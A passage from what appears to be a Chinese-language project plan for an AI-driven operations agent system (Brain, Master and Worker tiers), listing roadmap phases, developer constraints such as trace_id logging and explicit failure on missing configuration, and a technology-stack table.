- [ ] 节点身份管理（`worker_id` 生成与持久化）

### Phase 2：Master 核心

- [ ] WebSocket 服务端 + 连接认证
- [ ] 信封编解码 + 版本协商 + 字段校验
- [ ] Worker 注册表（能力清单管理）
- [ ] 三级优先级队列
- [ ] 指令路由（action → 具备该能力的 Worker）
- [ ] 指令追踪 + 超时 + 分片重组 + 滑动窗口流控
- [ ] 高危指令拦截 + 控制台审批模式
- [ ] 结构化日志（含 trace_id）

### Phase 3：Brain 核心

- [ ] LangGraph 状态图骨架（Analyst → Planner → Execute → Reflector）
- [ ] LLM Adapter 抽象接口 + Ollama 实现（流式解析、function calling）
- [ ] Master API 客户端（含重试、超时、优先级标记）
- [ ] 结构化日志（必含 trace_id）
- [ ] Self-correction 逻辑（基于真实错误分类处理）

### Phase 4：最小 E2E 链路

- [ ] Brain 发出请求 → Master 路由 → Worker 执行 → 结果返回 Brain
- [ ] 真实场景：Brain 巡检磁盘使用率，Worker 返回数据，Brain 判断是否正常
- [ ] 异常场景 1：Worker 执行失败 → Master 返回错误 → Brain Reflector 重新规划
- [ ] 异常场景 2：Master 断连 → Brain 等待重连 → 恢复后重发请求
- [ ] 异常场景 3：Worker 宕机 → Master 标记离线 → 尝试其他 Worker → 失败后通知 Brain

### Phase 5：能力迭代

- [ ] 补充 Worker 工具集（process、log、exec）
- [ ] 飞书审批集成
- [ ] 结果摘要提炼
- [ ] Brain 多步编排能力
- [ ] 时钟容错验证、网络分区测试
- [ ] 部署脚本与容器化（Dockerfile + docker-compose）

---

## 6. 开发者约束

1. **真实性 > 便利性**：宁可运行时崩溃，也不返回模拟数据。测试必须基于真实环境（真实 Ollama、真实 Worker 进程、真实目标服务）

2. **协议刚性**：信封协议字段不允许随意增删，变更需三层同步更新。协议版本号在变更时必须递增

3. **日志完整**：所有跨层调用必须携带 `trace_id`，日志为 JSON 结构化格式。无 `trace_id` 的日志视为无效日志

4. **容错至上**：任何外部依赖不可达时，必须有明确的降级行为（报错 / 排队 / 人工介入），不允许静默吞掉错误。网络分区时各节点必须独立存活

5. **工具原子性**：Worker 工具函数保持原子操作，一个 action 只做一件事。每个工具必须声明预期最大执行时间

6. **配置显式化**：配置缺失时必须启动失败并报具体错误，不允许"使用默认值"的静默行为

7. **幂等标注**：所有 Worker 工具必须标注是否幂等。非幂等工具依托 `msg_id` 实现去重

---

## 7. 技术栈选型总结

| 组件 | 技术 | 理由 |
|------|------|------|
| Brain 语言 | Python 3.11+ | LangGraph 生态，AI 生态第一语言 |
| Brain 推理框架 | LangGraph | 状态图编排，原生支持 self-correction 循环 |
| Brain LLM 接入 | 抽象 LLMAdapter → 当前 Ollama | 本地开发零成本，后续可切换任意模型 |
| Master 语言 | TypeScript + Node.js | 异步 I/O 适合长连接，类型安全 |
| Master 通信 | WebSocket + REST | 长连接保活 + 短查询接口 |
| Worker 语言 | Go 1.22+ | 单二进制分发，系统调用能力强 |
| Worker 序列化 | JSON（初期）/ Protobuf（后续） | 开发期调试便利性优先 |
| 容器化 | Docker + Docker Compose | 本地联调与部署一致 |
| 进程管理（开发） | tmux / 后台进程 | 轻量，零依赖 |
| 进程管理（生产） | systemd | Worker 和 Master 的标准托管方式 |
